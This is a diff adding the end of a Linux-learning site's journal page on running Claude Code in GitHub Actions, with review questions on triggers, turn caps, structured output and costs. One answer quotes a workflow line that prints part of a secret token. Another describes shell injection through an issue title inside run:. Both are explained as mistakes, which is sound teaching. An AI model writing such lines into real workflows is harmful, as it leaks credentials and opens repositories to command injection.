+<li><em>Claude Code in a job</em> (topic journal <code>claude-code</code>) — What a run costs</li>
+</ul>
+<p>Documentation:</p>
+<ul>
+<li>https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows</li>
+<li>https://code.claude.com/docs/en/cli-reference</li>
+<li>https://code.claude.com/docs/en/headless</li>
+<li>https://docs.github.com/en/actions/reference/security/secure-use</li>
+</ul>
+<p>The whole subject, end to end: the topic journal <em>Claude Code in a job</em> (<code>claude-code</code>) —
+the mechanism, the symptoms and their causes, exercises, and sources.</p>
+<h2 id="review">Review</h2>
+<ol>
+<li>
+<p>A workflow has <code>on: issues</code> with no types. Name three activities that start it besides opening an
+issue.</p>
+<blockquote>
+<p>Any of: edited, deleted, closed, reopened, assigned, unassigned, labeled, unlabeled, pinned,
+transferred, milestoned. Each is a run; <code>types: [opened]</code> limits it to new issues.</p>
+</blockquote>
+</li>
+<li>
+<p>What stops a <code>claude -p</code> run whose model keeps calling tools, if the command has no caps?</p>
+<blockquote>
+<p>Nothing in Claude Code: <code>-p</code> has no default turn or budget limit. Only an outside limit — the job's
+<code>timeout-minutes</code> (360 by default) or a <code>timeout</code> command — ends it.</p>
+</blockquote>
+</li>
+<li>
+<p>How does a run end when it reaches <code>--max-turns</code>, and why should the script notice?</p>
+<blockquote>
+<p>With <code>subtype: error_max_turns</code>, <code>is_error: true</code> and exit status 1, and without an answer. A
+script that ignores it would act on an empty label.</p>
+</blockquote>
+</li>
+<li>
+<p>With <code>--tools &quot;&quot;</code> and <code>--json-schema</code>, which tools does the model see, and where is the answer?</p>
+<blockquote>
+<p>Only <code>StructuredOutput</code>. The validated object is in <code>structured_output</code>; <code>result</code> holds it as a JSON
+string.</p>
+</blockquote>
+</li>
+<li>
+<p>Why is <code>--dangerously-skip-permissions</code> a cost problem as well as a safety problem in a labelling
+job?</p>
+<blockquote>
+<p>It offers the model every tool (21 here), whose definitions are sent on every request and which
+invite extra turns of exploration — each one billed — besides letting it act without checks.</p>
+</blockquote>
+</li>
+<li>
+<p>What is wrong with <code>run: echo &quot;token starts ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}&quot; | cut -c1-24</code>?</p>
+<blockquote>
+<p>The secret is pasted into the script and its first characters are printed. Log masking hides exact
+matches, not a prefix produced by <code>cut</code>. There is no safe way to print part of a secret.</p>
+</blockquote>
+</li>
+<li>
+<p>Why is <code>${{ github.event.issue.title }}</code> inside <code>run:</code> dangerous even when quoted, and what is the
+fix?</p>
+<blockquote>
+<p>The expression is substituted into the script text before the shell parses it; a title containing
+a quote and <code>$(…)</code> becomes code. Put it in <code>env:</code> and use <code>&quot;$TITLE&quot;</code>.</p>
+</blockquote>
+</li>
+<li>
+<p>What does <code>total_cost_usd</code> in a run's JSON result measure, on an API key and on a subscription token?</p>
+<blockquote>
+<p>Claude Code's client-side estimate at list prices. On an API key it approximates the bill; on a
+subscription token usage counts against the plan instead, and the figure is for comparison only.</p>
+</blockquote>
+</li>
+</ol>
+</article>
+    </div>
+  </div>
+</section>
+
+<footer class="site">
+  <div class="wrap">
+    <hr>
+    <div class="cols">
+      <div>
+        <div class="brand">[ norboten ]</div>
+        <p class="muted">Learn Linux by fixing it.<br>Apache-2.0.<span class="copyright">© 2026 Ihar Petushkou.</span></p>
+      </div>
+      <div>
+        <strong>Project</strong><br>
+        <a href="../../features/">Features</a><br>
+        <a href="../../labs/">Labs</a><br>
+        <a href="../../journals/">Journals</a><br>
+        <a href="../../how-it-works/">How it works</a>
+      </div>
+      <div>
+        <strong>Watch and compete</strong><br>
+        <a href="../../live/">Live</a><br>
+        <a href="../../players/">Ratings</a><br>
+        <a href="../../analytics/">Analytics</a>
+      </div>
+      <div>
+        <strong>Get started</strong><br>
+        <a href="../../install/">Install</a><br>
+        <a href="../../docs/">Docs</a><br>
+        <a href="../../docs/writing-a-lab/">Write a lab</a>
+      </div>
+      <div>
+        <strong>Norboten</strong><br>
+        <a href="../../about/">About</a><br>
+        <a href="../../community/">Community</a><br>
+        <a href="../../privacy/">Privacy policy</a>
+      </div>
+      <div>
+        <strong>Elsewhere</strong><br>
+        <a href="https://github.com/northelks/norboten" target="_blank" rel="noopener">GitHub</a>        <span class="muted counts">51 labs · 610 theory questions</span>
+        <span class="muted counts small"><a href="https://db-ip.com" target="_blank" rel="noopener">IP geolocation by DB-IP</a>, CC BY 4.0</span>
+      </div>
+    </div>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="Back to the top" title="Back to the top" hidden>
+  <svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="M8 13V4M3.5 8.5L8 4l4.5 4.5"
+    fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
+<script>
+/* Signed in, the nav and the footer say "Account" instead of "Sign in". The site has no cookies:
+   the only sign that anyone is signed in is the token account.js keeps, and the key below must
+   stay the same as KEY there. Inline, so the word is right before the page paints. */
+(function () {
+  try {
+    if (!localStorage.getItem("norboten.token") && !sessionStorage.getItem("norboten.token")) return;
+  } catch (e) { return; }  /* a private window can refuse storage; the word then stays "Sign in" */
+  var links = document.querySelectorAll(".nav-account");
+  for (var i = 0; i < links.length; i++) links[i].textContent = "Account";
+})();
+</script>
+<script src="../../totop.js"></script>
+<script src="../../ask-engine.js"></script>
+<script src="../../chat.js"></script>
+<script src="../../copy.js"></script>
+</body>
+</html>
